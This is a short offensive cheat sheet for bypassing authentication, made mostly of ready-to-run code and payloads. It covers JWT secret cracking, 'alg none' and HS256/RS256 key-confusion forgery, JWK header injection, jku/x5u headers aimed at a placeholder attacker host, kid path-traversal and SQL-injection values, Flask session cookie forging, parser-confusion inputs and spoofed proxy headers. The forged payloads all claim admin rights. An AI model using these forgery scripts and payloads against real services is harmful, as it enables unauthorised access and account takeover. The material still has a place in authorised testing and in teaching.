# Auth

## JWT

```bash
jwt_tool TOKEN
jwt_tool TOKEN -C -d /usr/share/wordlists/rockyou.txt
```

Tool: https://github.com/ticarpi/jwt_tool

```bash
git clone https://github.com/ticarpi/jwt_tool
cd jwt_tool
python3 -m pip install -r requirements.txt
python3 jwt_tool.py TOKEN
python3 jwt_tool.py TOKEN -C -d /usr/share/wordlists/rockyou.txt
python3 jwt_tool.py TOKEN -T
```

Decode by hand:

```bash
python - 'TOKEN' <<'PY'
import base64, json, sys
t = sys.argv[1] if len(sys.argv) > 1 else "TOKEN"
for part in t.split(".")[:2]:
    part += "=" * (-len(part) % 4)
    print(json.dumps(json.loads(base64.urlsafe_b64decode(part)), indent=2))
PY
```

```python
import jwt

print(jwt.encode({"sub": "admin"}, "JWT_SECRET", algorithm="HS256"))
```

## Default Secrets

```text
secret
your-secret-key
changeme
password
admin
dev
test
```

## alg none

```python
import base64
import json

def b64(x):
    return base64.urlsafe_b64encode(json.dumps(x).encode()).rstrip(b"=").decode()

print(b64({"alg": "none", "typ": "JWT"}) + "." + b64({"sub": "admin"}) + ".")
```

## HS256 With RSA Public Key

Use when verifier accepts both `RS256` and `HS256` and passes the RSA public key as the verify key.

```python
import base64
import hashlib
import hmac
import json

pub = open("public.pem", "rb").read()

def b64(x):
    if isinstance(x, dict):
        x = json.dumps(x, separators=(",", ":")).encode()
    return base64.urlsafe_b64encode(x).rstrip(b"=").decode()

header = {"alg": "HS256", "typ": "JWT"}
payload = {"sub": "admin", "username": "admin", "role": "admin"}
msg = (b64(header) + "." + b64(payload)).encode()
sig = hmac.new(pub, msg, hashlib.sha256).digest()
print(msg.decode() + "." + b64(sig))
```

## JWK Header

Use when verifier trusts `jwk` from the token header.

```bash
openssl genrsa -out key.pem 2048
openssl rsa -in key.pem -pubout -out pub.pem
```

```python
import base64
import jwt
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization

key = serialization.load_pem_private_key(open("key.pem", "rb").read(), password=None)
pub = key.public_key().public_numbers()

def b64int(n):
    raw = n.to_bytes((n.bit_length() + 7) // 8, "big")
    return base64.urlsafe_b64encode(raw).rstrip(b"=").decode()

jwk = {"kty": "RSA", "n": b64int(pub.n), "e": b64int(pub.e)}
headers = {"alg": "RS256", "jwk": jwk}
print(jwt.encode({"sub": "admin", "role": "admin"}, key, algorithm="RS256", headers=headers))
```

## jku / x5u / kid

```json
{"alg":"RS256","jku":"https://ATTACKER/jwks.json","kid":"pwn"}
{"alg":"RS256","x5u":"https://ATTACKER/cert.pem","kid":"pwn"}
{"alg":"HS256","kid":"../../../../tmp/key"}
{"alg":"HS256","kid":"1' UNION SELECT 'secret'-- -"}
```

Minimal JWKS:

```json
{"keys":[{"kty":"RSA","kid":"pwn","use":"sig","alg":"RS256","n":"BASE64URL_N","e":"AQAB"}]}
```

## Flask Cookie

Use when source leaks `SECRET_KEY`.

Tool: https://github.com/paradoxis/flask-unsign

```bash
python3 -m pip install flask-unsign[wordlist]
flask-unsign --decode --cookie 'COOKIE'
flask-unsign --unsign --cookie 'COOKIE' --wordlist /usr/share/wordlists/rockyou.txt
flask-unsign --sign --secret 'SECRET_KEY' --cookie "{'user':'admin'}"
```

## Parser Bypass

```http
GET /login?role=user&role=admin
Content-Type: application/x-www-form-urlencoded

username=admin&username=user&password=x
```

```json
{"username":"admin ","password":"x"}
{"username":"admin\u00a0","password":"x"}
{"username":["guest","admin"],"password":"x"}
```

## Headers

```http
X-Forwarded-User: admin
X-Original-URL: /admin
X-Rewrite-URL: /admin
X-Forwarded-Host: localhost
```
